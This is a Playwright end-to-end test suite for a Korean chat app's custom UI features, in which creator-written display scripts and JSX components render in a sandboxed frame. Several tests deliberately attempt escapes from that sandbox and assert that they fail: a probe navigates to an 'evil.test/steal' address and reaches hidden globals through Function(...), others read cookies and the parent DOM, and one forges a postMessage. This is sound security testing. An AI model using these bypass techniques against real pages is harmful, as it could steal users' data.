import { seedSession } from '../seedSession.js';
import { expect, test, type BrowserContext, type Page } from '@playwright/test';

/**
 * Layer 1 custom UI end to end: a creator authors a display script and a default
 * variable on their plot, chats with the echo model so the "reply" carries the
 * status block, and the chat draws it as a status window with a working choice
 * button. Then the viewer opt-out turns it all back into plain text.
 *
 * The steps build on each other, so the file runs serially against the dev stack
 * with a fresh account per run.
 */
test.describe.configure({ mode: 'serial' });

const run = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
const account = { email: `ui-${run}@example.test`, password: 'e2e-password-1234', name: `UI ${run}` };
const plot = { name: `상태창 플롯 ${run}`, description: `상태창 세계관 ${run}` };

/** What the model "says". The echo adapter streams the user's own words back. */
const statusTurn = '[status] hp=50 {{setvar::gold::7}} 검을 뽑았다';

const UUID_PATH = '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}';

let context: BrowserContext;
let page: Page;
/** Captured on creation; the Layer 2 tests come back to this plot's studio. */
let plotId = '';

test.beforeAll(async ({ browser }) => {
  context = await browser.newContext();
  page = await context.newPage();
});

test.afterAll(async () => {
  await context.close();
});

const assistantMessages = () => page.getByTestId('message-assistant');

/** The notes panel, opened only when it is not already showing. */
async function openPanel(): Promise<void> {
  const toggle = page.getByRole('button', { name: '노트', exact: true });
  if ((await toggle.getAttribute('aria-expanded')) !== 'true') await toggle.click();
  await expect(page.getByTestId('chat-panel')).toBeVisible();
}

/** Opens a chat on this plot's own page, which is where a chat starts now. */
async function startChat(): Promise<void> {
  await page.goto(`/ko/p/${plotId}`);
  await page.getByLabel('모델').selectOption('echo/echo');
  await page.getByRole('button', { name: '대화 시작' }).click();
  await expect(page).toHaveURL(new RegExp(`/ko/chats/${UUID_PATH}$`));
}

test('authors a display script and a default variable', async () => {
  await seedSession(page, account);
  await expect(page).toHaveURL(/\/ko$/);

  // Signup lands on the feed; making things lives under the creator area.
  await page.goto('/ko/plots');
  await page.getByRole('button', { name: '새 플롯' }).click();
  await page.getByPlaceholder('플롯 이름').fill(plot.name);
  await page.getByRole('button', { name: '만들기', exact: true }).click();
  await expect(page).toHaveURL(new RegExp(`/ko/plots/${UUID_PATH}$`));
  plotId = page.url().split('/').pop() ?? '';

  await page.getByLabel('세계관 설정').fill(plot.description);
  await page.getByRole('button', { name: '도입부 추가' }).click();
  await page.getByTestId('plot-intro').fill('문을 연다');

  await page.getByTestId('add-display-script').click();
  // The entry list collapses like the lorebook's, so the new row is opened first.
  await page.getByTestId('display-script').locator('summary').click();
  await page.getByTestId('display-script-in').fill('\\[status\\] hp=(\\d+)');
  await page
    .getByTestId('display-script-out')
    .fill(
      '<div class="status">HP $1 · 금화 {{getvar::gold}} · 절반 {{calc::$1 / 2}}' +
        '{{#if $1 < 60}}<b class="warn">위험</b>{{/if}}' +
        '{{button::쉰다::좀 쉬어야겠다}}</div>',
    );
  await page.getByTestId('display-script-action').selectOption('move_top');

  await page.getByTestId('add-variable').click();
  await page.getByTestId('variable-key').fill('gold');
  await page.getByTestId('variable-value').fill('3');

  await page.getByRole('button', { name: '저장', exact: true }).click();
  await expect(page.getByText('저장했습니다')).toBeVisible();

  // The studio round-trips what it saved.
  await page.reload();
  await expect(page.getByTestId('display-script')).toHaveCount(1);
  await expect(page.getByTestId('variable-key')).toHaveValue('gold');
});

test('renders the status window from an echoed status block', async () => {
  await startChat();

  await page.getByPlaceholder('메시지를 입력하세요').fill(statusTurn);
  await page.getByRole('button', { name: '보내기' }).click();
  await expect(assistantMessages()).toHaveCount(2);

  const reply = assistantMessages().last();
  const status = reply.locator('.shizue-msg .x-shizue-status');
  await expect(status).toBeVisible();
  // The capture, the branch-derived variable (the message's own setvar wins over
  // the plot default) and the calc all bind.
  await expect(status).toContainText('HP 50 · 금화 7 · 절반 25');
  // The conditional block held, and its class went through the namespace.
  await expect(status.locator('.x-shizue-warn')).toHaveText('위험');
  // move_top put the window ahead of the prose it was cut out of.
  await expect(reply).toContainText('검을 뽑았다');
  // The setvar macro is protocol for the model, so it is not on screen.
  await expect(reply).not.toContainText('setvar');
});

test('a template button fills the composer without sending', async () => {
  const composer = page.getByPlaceholder('메시지를 입력하세요');
  await expect(composer).toHaveValue('');

  await assistantMessages().last().getByRole('button', { name: '쉰다' }).click();

  await expect(composer).toHaveValue('좀 쉬어야겠다');
  // Filling is all it does: no new turn was started.
  await expect(assistantMessages()).toHaveCount(2);
  await composer.fill('');
});

test('the viewer opt-out falls back to plain text', async () => {
  await openPanel();
  await page.getByLabel('커스텀 UI 표시').uncheck();

  const reply = assistantMessages().last();
  await expect(reply.locator('.shizue-msg')).toHaveCount(0);
  // The raw block is readable again…
  await expect(reply).toContainText('[status] hp=50');
  // …but the variable macros stay hidden either way.
  await expect(reply).not.toContainText('setvar');

  // Stored per browser, so it survives a reload.
  await page.reload();
  await expect(assistantMessages().last().locator('.shizue-msg')).toHaveCount(0);

  await openPanel();
  await page.getByLabel('커스텀 UI 표시').check();
  await expect(assistantMessages().last().locator('.shizue-msg .x-shizue-status')).toBeVisible();
});

/**
 * Layer 2: the creator registers a JSX component, the opening carries a call
 * code, and the chat draws it in a sandboxed frame — including the parts jsdom
 * cannot show, which is the sandbox itself: what the frame can and cannot reach.
 */
const COMPONENT = `function StatusWindow({ hp = 0, name = '이름 없음', platform }) {
  const [open, setOpen] = useState(false);
  return (
    <div id="panel" style={{ padding: 8, border: '1px solid #2a2a33', borderRadius: 10 }}>
      <b>{name}</b>
      <span> HP {hp} · 금화 {platform.variables.gold} · 턴 {platform.turn}</span>
      <button onClick={() => setOpen(!open)}>펼치기</button>
      {open ? <div id="detail">상세</div> : null}
      <button onClick={() => platform.suggestInput('좀 쉬어야겠다')}>쉬자</button>
    </div>
  );
}`;

/** The opening the model would otherwise have written: prose plus a call code. */
const opening = '문을 연다\n<StatusWindow hp={70} name="루미" />';

test('authors a component and sees it render in the preview', async () => {
  await page.goto(`/ko/plots/${plotId}`);
  await page.getByTestId('component-code').fill(COMPONENT);
  await page.getByTestId('component-call').fill('<StatusWindow hp={42} name="미리보기" />');

  // The preview is the same frame the chat mounts, driven by the same runtime.
  const preview = page.getByTestId('component-preview').locator('iframe');
  await expect(preview.contentFrame().locator('#panel')).toContainText('HP 42');
  await expect(preview.contentFrame().locator('#panel')).toContainText('미리보기');

  // A subset violation is visible while it is being typed, not at read time.
  await page.getByTestId('component-code').fill(`${COMPONENT}\nconst t = setInterval(f, 10);`);
  await expect(page.getByTestId('component-subset-error')).toContainText('setTimeout');
  await page.getByTestId('component-code').fill(COMPONENT);
  await expect(page.getByTestId('component-subset-error')).toHaveText('');

  await page.getByTestId('plot-intro').fill(opening);
  await page.getByRole('button', { name: '저장', exact: true }).click();
  await expect(page.getByText('저장했습니다')).toBeVisible();
});

test('renders the call code in the opening as a component', async () => {
  await startChat();

  const openingRow = assistantMessages().first();
  const frame = openingRow.locator('iframe');
  const panel = frame.contentFrame().locator('#panel');
  // Props parsed out of the call code…
  await expect(panel).toContainText('HP 70');
  await expect(panel).toContainText('루미');
  // …and platform state the call code never mentioned: the plot's own default
  // variable and the turn count, injected by us.
  await expect(panel).toContainText('금화 3');
  await expect(panel).toContainText('턴 0');
  // The prose around the call code is still prose, and the call code itself is
  // off the screen (it stays in the message, so the model keeps seeing it).
  await expect(openingRow).toContainText('문을 연다');
  await expect(openingRow).not.toContainText('StatusWindow');

  // Component state lives in the frame and survives a click.
  await expect(frame.contentFrame().locator('#detail')).toHaveCount(0);
  await frame.contentFrame().getByRole('button', { name: '펼치기' }).click();
  await expect(frame.contentFrame().locator('#detail')).toBeVisible();
});

test('a component can fill the composer and nothing else', async () => {
  const composer = page.getByPlaceholder('메시지를 입력하세요');
  await expect(composer).toHaveValue('');

  await assistantMessages()
    .first()
    .locator('iframe')
    .contentFrame()
    .getByRole('button', { name: '쉬자' })
    .click();

  await expect(composer).toHaveValue('좀 쉬어야겠다');
  // Filling is all it does: no turn was sent.
  await expect(assistantMessages()).toHaveCount(1);
  await composer.fill('');
});

test('the frame cannot reach the app, the network or storage', async () => {
  const frame = page.frames().find((candidate) => candidate.url() === 'about:srcdoc');
  expect(frame, 'the component frame is a srcdoc document').toBeTruthy();

  const reach = await frame!.evaluate(async () => {
    const attempt = async (run: () => unknown): Promise<string> => {
      try {
        await run();
        return 'reached';
      } catch {
        return 'blocked';
      }
    };
    // `fetch` lives on Window.prototype, so the runtime's own shadowing can be
    // undone and the *browser's* answer observed. `localStorage`,
    // `XMLHttpRequest` and friends are own properties of the global object: once
    // overwritten they cannot be recovered at all, which is why they are only
    // asserted as gone (on an opaque origin they would throw anyway).
    const proto = Object.getPrototypeOf(window) as Record<string, unknown>;
    return {
      removed: ['fetch', 'XMLHttpRequest', 'WebSocket', 'RTCPeerConnection', 'localStorage'].every(
        (name) => (window as unknown as Record<string, unknown>)[name] === undefined,
      ),
      fetch: await attempt(() => (proto['fetch'] as typeof globalThis.fetch).call(window, '/api/models')),
      cookie: await attempt(() => document.cookie),
      parentDom: await attempt(() => window.parent.document.title),
      topLocation: await attempt(() => window.top!.location.href),
    };
  });

  // The globals are gone, and the one that can be recovered leads nowhere:
  // `connect-src 'none'` refuses the request. The last three are the opaque
  // origin itself — no cookies, and no view of the page that embedded it.
  expect(reach).toEqual({
    removed: true,
    fetch: 'blocked',
    cookie: 'blocked',
    parentDom: 'blocked',
    topLocation: 'blocked',
  });
});

test('the viewer opt-out mounts no frame at all', async () => {
  await openPanel();
  await page.getByLabel('커스텀 UI 표시').uncheck();

  const openingRow = assistantMessages().first();
  await expect(openingRow.locator('iframe')).toHaveCount(0);
  // The call code reads as the plain text it is.
  await expect(openingRow).toContainText('<StatusWindow hp={70}');

  await openPanel();
  await page.getByLabel('커스텀 UI 표시').check();
  await expect(openingRow.locator('iframe')).toHaveCount(1);
});

/**
 * Where creator code actually runs: a worker inside the frame.
 *
 * The probe reports what the component itself can see, so the assertion is the
 * creator's own view rather than ours, and it reaches for the globals through
 * `Function(…)` — which the subset screen does not catch, deliberately: the
 * screen is not the boundary, the realm is.
 */
const PROBE = `function Probe() {
  const seen = Function('return [typeof RTCPeerConnection, typeof document, typeof fetch, typeof XMLHttpRequest, typeof importScripts, typeof location].join(",")')();
  let navigation = 'blocked';
  try {
    Function('return location')().href = 'https://evil.test/steal';
    navigation = 'navigated';
  } catch (error) {
    navigation = 'blocked';
  }
  return <div id="probe">{seen} | {navigation}</div>;
}`;

/** Renders forever. On the renderer thread this froze the tab. */
const LOOP = `function Loop() {
  let n = 0;
  while (true) { n += 1; }
  return <div>{n}</div>;
}`;

/** Puts `code` on the plot, makes the opening call `name`, and opens a chat. */
async function chatWithComponent(code: string, name: string): Promise<void> {
  await page.goto(`/ko/plots/${plotId}`);
  await page.getByTestId('component-code').fill(code);
  await page.getByTestId('plot-intro').fill(`문을 연다\n<${name} />`);
  await page.getByRole('button', { name: '저장', exact: true }).click();
  await expect(page.getByText('저장했습니다')).toBeVisible();

  await startChat();
}

test('a component sees no document, no network and no WebRTC', async () => {
  await chatWithComponent(PROBE, 'Probe');

  const probe = assistantMessages().first().locator('iframe').contentFrame().locator('#probe');
  // RTCPeerConnection does not exist in worker scope at all, which is what closes
  // the data channel that would otherwise walk around `connect-src 'none'`; the
  // rest are shadowed on the worker's own global, so `Function('return fetch')()`
  // finds an own `undefined` rather than the real thing.
  await expect(probe).toHaveText('undefined,undefined,undefined,undefined,undefined,undefined | blocked');
});

test('an endless component is stopped and the page stays usable', async () => {
  await chatWithComponent(LOOP, 'Loop');

  // The component is spinning right now. If it were spinning on the renderer
  // thread this would time out; it is on the worker's, so it types immediately.
  const composer = page.getByPlaceholder('메시지를 입력하세요');
  const started = Date.now();
  await composer.fill('아직 입력됩니다');
  await expect(composer).toHaveValue('아직 입력됩니다');
  // …and well inside the 2s the frame gives a first render, so the page was
  // responsive while the loop was still running rather than after it was killed.
  expect(Date.now() - started).toBeLessThan(2000);

  // Then the frame terminates the worker and says so.
  const frame = assistantMessages().first().locator('iframe').contentFrame();
  await expect(frame.locator('.shizue-fallback')).toContainText('컴포넌트 오류');
  await expect(frame.locator('.shizue-fallback')).toContainText('2000ms');
  await composer.fill('');
});

test('the window channel stays shut after the handshake', async () => {
  // A message shaped like the bridge's own, from the page itself: the parent
  // honours nothing but the frame's one-shot `ready`, so the composer is untouched.
  const composer = page.getByPlaceholder('메시지를 입력하세요');
  await page.evaluate(() => window.postMessage({ type: 'suggestInput', text: '악성 입력' }, '*'));
  await expect(composer).toHaveValue('');
});
